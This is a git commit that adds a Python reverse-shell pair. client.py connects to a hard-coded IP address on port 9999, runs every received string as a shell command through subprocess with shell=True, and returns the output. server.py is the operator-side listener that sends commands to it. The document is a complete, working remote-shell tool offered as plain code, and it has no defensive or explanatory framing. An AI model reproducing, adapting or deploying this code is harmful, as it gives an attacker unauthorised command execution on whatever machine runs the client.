277bc7f43f634d5d043f9f57faf61b3cbee746f5
Shaykh Siddique <shaykhsiddiqee@gmail.com>
2019-01-16 22:51:42 +0600

    First upload

---
+++ client.py
@@ -0,0 +1,28 @@
+import socket
+import os
+import subprocess
+
+skt = socket.socket()
+# change this IP address to server ip address.
+host ="172.31.38.46"
+port = 9999
+
+skt.connect((host, port))
+
+while True:
+    data = skt.recv(1024)
+    if data[:2].decode("utf-8") == "cd":
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data)>0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_string = str(output_byte)
+
+        currentWD = os.getcwd() + " >> "
+
+        skt.send(str.encode(output_string +"\n"+currentWD))
+
+        print(str(output_string))
+
+
+
---
+++ server.py
@@ -0,0 +1,61 @@
+import socket
+import sys
+
+
+def create_socket():
+    try:
+        global host
+        global port
+        global skt
+        host =""
+        port =9999
+        skt = socket.socket()
+    except socket.error as msg:
+        print("Socket Creation Error: "+ str(msg)+"\n")
+
+
+def bind_sockets():
+    try:
+        global host
+        global port
+        global skt
+
+        print("Binding the port: "+ str(port) +" .....\n")
+        skt.bind((host, port))
+        skt.listen(5)
+
+    except socket.error as msg:
+        print("Socket binding error: "+ str(msg)+"\nRetrying...")
+        bind_sockets()
+
+
+def socket_accept():
+    conn, address = skt.accept()
+    print("Connection established | Ip: " + address[0] + " port: " + str(address[1]))
+
+    #here goes all commands
+    send_commands(conn)
+    conn.close()
+
+
+def send_commands(conn):
+
+    while True:
+        cmd = input()
+        if cmd == "quit":
+            conn.close()
+            skt.close()
+            sys.exit()
+        if len(str.encode(cmd))>0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response, end="")
+
+
+def main():
+    create_socket()
+    bind_sockets()
+    socket_accept()
+
+
+main()
